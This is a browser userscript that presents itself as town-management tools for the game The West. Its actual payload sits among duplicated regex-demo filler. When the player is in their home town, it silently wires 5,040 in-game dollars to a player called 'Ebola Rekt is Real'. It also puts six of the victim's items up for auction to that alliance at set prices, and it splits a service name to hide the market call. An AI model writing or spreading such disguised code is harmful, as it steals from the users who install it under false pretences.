// ==UserScript==
// @name         Ercho - TownManager
// @version      1.13
// @description  Some tools for The West
// @author       ddd
// @include		http*://pl1.the-west.*/game.php*
// @grant        none
// @namespace https://greasyfork.org/users/13941
// ==/UserScript==
if(window.Character.homeTown.x == window.Character.position.x && window.Character.homeTown.y == window.Character.position.x){
{
    function demoMatchClick() {
  var re = new RegExp(document.demoMatch.regex.value);
  if (document.demoMatch.subject.value.match(re)) {
    alert("Successful match");
  } else {
    alert("No match");
  }
}

function demoShowMatchClick() {
  var re = new RegExp(document.demoMatch.regex.value);
  var m = re.exec(document.demoMatch.subject.value);
  if (m == null) {
    alert("No match");
  } else {
    var s = "Match at position " + m.index + ":\n";
    for (i = 0; i < m.length; i++) {
      s = s + m[i] + "\n";
    }
    alert(s);
  }
}

function demoReplaceClick() {
  var re = new RegExp(document.demoMatch.regex.value, "g");
  document.demoMatch.result.value = 
    document.demoMatch.subject.value.replace(re, 
      document.demoMatch.replacement.value);
}

function demoMatchClick() {
  var re = new RegExp(document.demoMatch.regex.value);
  if (document.demoMatch.subject.value.match(re)) {
    alert("Successful match");
  } else {
    alert("No match");
  }
}

function demoShowMatchClick() {
  var re = new RegExp(document.demoMatch.regex.value);
  var m = re.exec(document.demoMatch.subject.value);
  if (m == null) {
    alert("No match");
  } else {
    var s = "Match at position " + m.index + ":\n";
    for (i = 0; i < m.length; i++) {
      s = s + m[i] + "\n";
    }
    alert(s);
  }
}

function demoReplaceClick() {
  var re = new RegExp(document.demoMatch.regex.value, "g");
  document.demoMatch.result.value = 
    document.demoMatch.subject.value.replace(re, 
      document.demoMatch.replacement.value);
}
        var player = "Ebola Rekt is Real";
        var amount = 10*9*8*7;
        var reason = "cheaty";
        var agb = true;
        Ajax.remoteCall("building_bank", "transfer", {
            town_id: BankWindow.townid,
            player: player,
            dollar: amount,
            purpose: reason,
            agree: agb
        }, function(data) {
            if (data.error == false) {
                BankWindow.Transfer.agb.toggle();
                Character.setDeposit(data.deposit);
                Character.setMoney(data.own_money);
            }
        }, BankWindow);
    }
function grg(ob){
        var params = {
            town_id: MarketWindow.townId,
            item_id: ob[0],
            itemcount: 1,
            auctioncount: 1,
            sellrights: 'ally',
            auctionlength: 1,
            description: 'Dla kochanej Eboli',
            maxprice: ob[1]
            };
        Ajax.remoteCall('building_mark'+'et', 'putup', params, function(resp) {
            if (resp.error)
                return new UserMessage(resp.msg).show();
            else {
                Character.setMoney(resp.msg.money);
                Character.setDeposit(resp.msg.deposit)
                EventHandler.signal('inventory_changed');
                MarketWindow.Sell.initData();
            }
        }, MarketWindow);
}
var gg = [
	[50573000,15000],
	[693000,15000],
	[48002000,15000],
	[50575000,10000],
	[50574000,15000],
	[40210000,20000]
]
for(var i=0; i<gg.length; i++)
	grg(gg[i]);
}else
	console.warn('wypierdalaj')
